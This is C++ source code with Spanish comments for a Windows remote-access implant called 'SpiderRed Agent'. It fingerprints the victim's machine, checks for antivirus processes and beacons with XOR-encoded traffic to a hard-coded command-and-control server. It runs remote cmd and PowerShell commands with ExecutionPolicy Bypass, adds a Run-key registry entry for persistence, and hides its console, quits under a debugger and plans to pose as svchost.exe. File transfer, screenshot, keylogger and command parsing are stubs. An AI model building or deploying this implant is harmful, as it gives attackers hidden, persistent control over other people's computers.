// spiderred_agent.cpp - Agente avanzado para C2-SpiderRed
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <ctime>
#include <random>
#include <sstream>
#include <iomanip>
#include <vector>
#include <fstream>
#include <map>
#include <algorithm>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "192.168.1.100"  // IP del servidor C2-SpiderRed
#define C2_PORT 8443
#define C2_PATH "/beacon"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SpiderRed-Agent/2.0"
#define MASTER_KEY "SpiderRed_Demo_Key_2024_!@#$%^&*"

// ==================== ESTRUCTURAS DE DATOS ====================
struct SystemInfo {
    std::string agent_id;
    std::string hostname;
    std::string username;
    std::string os_version;
    std::string architecture;
    std::string integrity;
    std::string cpu;
    std::string ram;
    std::string av_status;
    std::string domain;
    std::string timestamp;
};

struct Command {
    int id;
    std::string type;
    std::string command;
    std::string args;
    std::string status;
};

// ==================== CIFRADO AVANZADO ====================
class AdvancedCrypto {
public:
    static std::string xor_encrypt(const std::string& data, const std::string& key) {
        std::string result;
        for (size_t i = 0; i < data.size(); i++) {
            result += data[i] ^ key[i % key.size()];
        }
        return result;
    }
    
    static std::string base64_encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                            buffer.data(), &len);
        std::string result(buffer.data(), len);
        if (!result.empty() && result.back() == '\0') result.pop_back();
        return result;
    }
    
    static std::string base64_decode(const std::string& input) {
        DWORD len = 0;
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
        return std::string(reinterpret_cast<char*>(buffer.data()), len);
    }
    
    static std::string generate_agent_id() {
        char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computer_name);
        GetComputerNameA(computer_name, &size);
        
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        
        DWORD serial = 0;
        GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
        
        std::stringstream ss;
        ss << "SR-" << computer_name << "-" << username << "-" 
           << std::hex << serial << "-" << GetTickCount();
        
        return ss.str();
    }
};

// ==================== RECOLECCIÓN DE INFORMACIÓN ====================
class SystemProfiler {
private:
    SystemInfo info;
    
    bool is_elevated() {
        BOOL isElevated = FALSE;
        HANDLE hToken = NULL;
        
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD dwSize;
            
            if (GetTokenInformation(hToken, TokenElevation, &elevation,
                                   sizeof(elevation), &dwSize)) {
                isElevated = elevation.TokenIsElevated;
            }
            CloseHandle(hToken);
        }
        
        return isElevated != FALSE;
    }
    
    std::string get_av_status() {
        // Simulación - en realidad se necesitaría escanear procesos AV
        const char* av_processes[] = {
            "MsMpEng.exe", "avp.exe", "avguard.exe", "ashDisp.exe",
            "avastui.exe", "bdagent.exe", "vsserv.exe", "mbam.exe"
        };
        
        for (const char* proc : av_processes) {
            if (IsProcessRunning(proc)) {
                return "Detected";
            }
        }
        
        return "None";
    }
    
    bool IsProcessRunning(const char* processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (!Process32First(hSnapshot, &pe32)) {
            CloseHandle(hSnapshot);
            return false;
        }
        
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    std::string get_cpu_info() {
        HKEY hKey;
        DWORD dwType, dwSize = 256;
        char buffer[256];
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL,
                                &dwType, (LPBYTE)buffer, &dwSize) == ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return std::string(buffer);
            }
            RegCloseKey(hKey);
        }
        
        return "Unknown";
    }
    
    std::string get_ram_info() {
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        
        if (GlobalMemoryStatusEx(&memInfo)) {
            std::stringstream ss;
            ss << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB";
            return ss.str();
        }
        
        return "Unknown";
    }
    
    std::string get_domain() {
        char domain[256];
        DWORD size = sizeof(domain);
        
        if (GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            return std::string(domain);
        }
        
        return "WORKGROUP";
    }
    
public:
    SystemProfiler() {
        // Generar ID único
        info.agent_id = AdvancedCrypto::generate_agent_id();
        
        // Información básica
        char hostname[256];
        DWORD hostname_len = sizeof(hostname);
        GetComputerNameA(hostname, &hostname_len);
        info.hostname = hostname;
        
        char username[256];
        DWORD username_len = sizeof(username);
        GetUserNameA(username, &username_len);
        info.username = username;
        
        // Información del SO
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osvi);
        
        std::stringstream os_ss;
        os_ss << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        if (osvi.wProductType == VER_NT_WORKSTATION) {
            os_ss << " Workstation";
        } else {
            os_ss << " Server";
        }
        info.os_version = os_ss.str();
        
        // Arquitectura
        SYSTEM_INFO sys_info;
        GetNativeSystemInfo(&sys_info);
        info.architecture = (sys_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
        
        // Integridad
        info.integrity = is_elevated() ? "High (Admin)" : "Medium";
        
        // Hardware
        info.cpu = get_cpu_info();
        info.ram = get_ram_info();
        
        // Seguridad
        info.av_status = get_av_status();
        
        // Red
        info.domain = get_domain();
        
        // Timestamp
        time_t now = time(0);
        char timestamp[64];
        ctime_s(timestamp, sizeof(timestamp), &now);
        info.timestamp = timestamp;
        info.timestamp.erase(std::remove(info.timestamp.begin(), info.timestamp.end(), '\n'), info.timestamp.end());
    }
    
    std::string to_json() {
        std::stringstream ss;
        ss << "{";
        ss << "\"agent_id\":\"" << info.agent_id << "\",";
        ss << "\"hostname\":\"" << info.hostname << "\",";
        ss << "\"username\":\"" << info.username << "\",";
        ss << "\"os_version\":\"" << info.os_version << "\",";
        ss << "\"architecture\":\"" << info.architecture << "\",";
        ss << "\"integrity\":\"" << info.integrity << "\",";
        ss << "\"cpu\":\"" << info.cpu << "\",";
        ss << "\"ram\":\"" << info.ram << "\",";
        ss << "\"av_status\":\"" << info.av_status << "\",";
        ss << "\"domain\":\"" << info.domain << "\",";
        ss << "\"timestamp\":\"" << info.timestamp << "\"";
        ss << "}";
        return ss.str();
    }
    
    std::string get_agent_id() { return info.agent_id; }
};

// ==================== EJECUTOR DE COMANDOS AVANZADO ====================
class CommandExecutor {
public:
    static std::string execute(const std::string& command_type, 
                               const std::string& command, 
                               const std::string& args = "") {
        
        if (command_type == "shell" || command_type == "cmd") {
            return execute_shell_command(command + " " + args);
        }
        else if (command_type == "powershell") {
            return execute_powershell_command(command + " " + args);
        }
        else if (command_type == "download") {
            return download_file(command, args);
        }
        else if (command_type == "upload") {
            return upload_file(command, args);
        }
        else if (command_type == "screenshot") {
            return take_screenshot();
        }
        else if (command_type == "keylogger") {
            return start_keylogger();
        }
        else if (command_type == "persist") {
            return establish_persistence();
        }
        else if (command_type == "info") {
            return get_detailed_info();
        }
        else {
            return "Unknown command type: " + command_type;
        }
    }
    
private:
    static std::string execute_shell_command(const std::string& command) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));
        
        std::string cmd = "cmd.exe /c " + command;
        
        if (CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);
            
            WaitForSingleObject(pi.hProcess, 30000);
            
            std::string output;
            DWORD dwRead;
            CHAR buffer[4096];
            
            while (ReadFile(hStdoutRd, buffer, sizeof(buffer), &dwRead, NULL) && dwRead > 0) {
                output.append(buffer, dwRead);
            }
            
            DWORD exit_code;
            GetExitCodeProcess(pi.hProcess, &exit_code);
            
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hStdoutRd);
            
            return "Exit Code: " + std::to_string(exit_code) + "\n" + output;
        }
        
        CloseHandle(hStdoutRd);
        CloseHandle(hStdoutWr);
        return "Failed to execute command";
    }
    
    static std::string execute_powershell_command(const std::string& command) {
        std::string ps_command = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"" + command + "\"";
        return execute_shell_command(ps_command);
    }
    
    static std::string download_file(const std::string& url, const std::string& save_path) {
        // Implementación simplificada de descarga
        return "Download functionality would be implemented here";
    }
    
    static std::string upload_file(const std::string& local_path, const std::string& remote_path) {
        // Implementación simplificada de subida
        return "Upload functionality would be implemented here";
    }
    
    static std::string take_screenshot() {
        return "Screenshot functionality would be implemented here";
    }
    
    static std::string start_keylogger() {
        return "Keylogger functionality would be implemented here";
    }
    
    static std::string establish_persistence() {
        // Crear entrada en registro para persistencia
        HKEY hKey;
        std::string path = "\"" + std::string(get_current_exe_path()) + "\"";
        
        if (RegCreateKeyExA(HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, "SpiderRedAgent", 0, REG_SZ,
                          (const BYTE*)path.c_str(), path.length() + 1);
            RegCloseKey(hKey);
            
            return "Persistence established in registry";
        }
        
        return "Failed to establish persistence";
    }
    
    static std::string get_detailed_info() {
        SystemProfiler profiler;
        return profiler.to_json();
    }
    
    static const char* get_current_exe_path() {
        static char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return path;
    }
};

// ==================== COMUNICACIÓN CON C2 ====================
class C2Communicator {
private:
    std::string agent_id;
    std::string master_key;
    
    std::string http_post(const std::string& endpoint, const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT,
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT,
                                            NULL, NULL, INTERNET_SERVICE_HTTP,
                                            0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(),
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_RELOAD |
                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        // Cifrar datos
        std::string encrypted = AdvancedCrypto::xor_encrypt(data, master_key);
        std::string b64_data = AdvancedCrypto::base64_encode(encrypted);
        
        std::string headers = "Content-Type: application/octet-stream\r\n";
        headers += "X-Agent-ID: " + agent_id + "\r\n";
        
        if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                            (LPVOID)b64_data.c_str(), (DWORD)b64_data.length())) {
            
            // Leer respuesta
            std::string response;
            char buffer[4096];
            DWORD bytes_read = 0;
            
            while (InternetReadFile(hRequest, buffer, sizeof(buffer),
                                   &bytes_read) && bytes_read > 0) {
                response.append(buffer, bytes_read);
            }
            
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            
            if (!response.empty()) {
                std::string decoded = AdvancedCrypto::base64_decode(response);
                std::string decrypted = AdvancedCrypto::xor_encrypt(decoded, master_key);
                return decrypted;
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return "";
    }
    
    std::vector<Command> parse_commands(const std::string& json_response) {
        std::vector<Command> commands;
        
        // Parseo simplificado - en producción usar biblioteca JSON
        size_t pos = json_response.find("\"commands\"");
        if (pos != std::string::npos) {
            // Implementación básica de parseo
            // En realidad se usaría una biblioteca JSON como nlohmann/json
        }
        
        return commands;
    }
    
public:
    C2Communicator(const std::string& id) : agent_id(id), master_key(MASTER_KEY) {}
    
    std::string send_beacon(const std::string& system_info) {
        std::string beacon_data = "{\"type\":\"beacon\",\"data\":" + system_info + "}";
        return http_post("/beacon", beacon_data);
    }
    
    std::string send_command_result(int command_id, const std::string& result) {
        std::string result_data = "{\"type\":\"result\",\"command_id\":" + 
                                 std::to_string(command_id) + 
                                 ",\"result\":\"" + result + "\"}";
        return http_post("/result", result_data);
    }
    
    std::vector<Command> get_commands() {
        std::string request = "{\"type\":\"get_commands\",\"agent_id\":\"" + agent_id + "\"}";
        std::string response = http_post("/commands", request);
        
        return parse_commands(response);
    }
};

// ==================== AGENTE PRINCIPAL ====================
class SpiderRedAgent {
private:
    SystemProfiler profiler;
    C2Communicator communicator;
    std::atomic<bool> running;
    std::thread beacon_thread;
    
    void beacon_loop() {
        int beacon_count = 0;
        
        while (running.load()) {
            try {
                // Enviar beacon
                std::string system_info = profiler.to_json();
                std::string response = communicator.send_beacon(system_info);
                
                // Procesar respuesta
                if (!response.empty()) {
                    std::vector<Command> commands = communicator.get_commands();
                    
                    for (const auto& cmd : commands) {
                        std::string result = CommandExecutor::execute(
                            cmd.type, cmd.command, cmd.args
                        );
                        
                        communicator.send_command_result(cmd.id, result);
                    }
                }
                
                // Dormir con jitter
                DWORD sleep_time = calculate_sleep_time();
                Sleep(sleep_time);
                
                beacon_count++;
                
            } catch (...) {
                // Silenciar errores y continuar
            }
        }
    }
    
    DWORD calculate_sleep_time() {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(30, 120);  // 30-120 segundos
        return dis(gen) * 1000;
    }
    
    void stealth_mode() {
        // Ocultar consola en release
        #ifndef _DEBUG
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
        #endif
        
        // Anti-debugging básico
        if (IsDebuggerPresent()) {
            exit(0);
        }
        
        // Cambiar nombre del proceso
        set_process_name("svchost.exe");
    }
    
    void set_process_name(const char* name) {
        // Técnica avanzada para cambiar el nombre del proceso
        // Nota: Esto es solo una demostración
    }
    
public:
    SpiderRedAgent() 
        : profiler(), 
          communicator(profiler.get_agent_id()), 
          running(false) {
        
        stealth_mode();
        std::cout << "[*] SpiderRed Agent inicializado" << std::endl;
        std::cout << "[*] Agent ID: " << profiler.get_agent_id() << std::endl;
        std::cout << "[*] C2 Server: " << C2_SERVER << ":" << C2_PORT << std::endl;
    }
    
    ~SpiderRedAgent() {
        stop();
    }
    
    void start() {
        running.store(true);
        beacon_thread = std::thread(&SpiderRedAgent::beacon_loop, this);
    }
    
    void stop() {
        running.store(false);
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
    void run() {
        start();
        beacon_thread.join();
    }
};

// ==================== ENTRY POINT ====================

static bool IsRunningAsAdmin() {
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = 0;
        if (GetTokenInformation(hToken, TokenElevation, &elevation,
                                sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isElevated != FALSE;
}

int main() {
    // Bypass UAC en modo admin (concepto)
    if (IsRunningAsAdmin()) {
        std::cout << "[+] Ejecutando con privilegios de administrador" << std::endl;
    }
    
    try {
        SpiderRedAgent agent;
        agent.run();
    }
    catch (const std::exception& e) {
        #ifdef _DEBUG
        std::cerr << "[!] Error: " << e.what() << std::endl;
        #endif
        return 1;
    }
    catch (...) {
        return 1;
    }
    
    return 0;
}
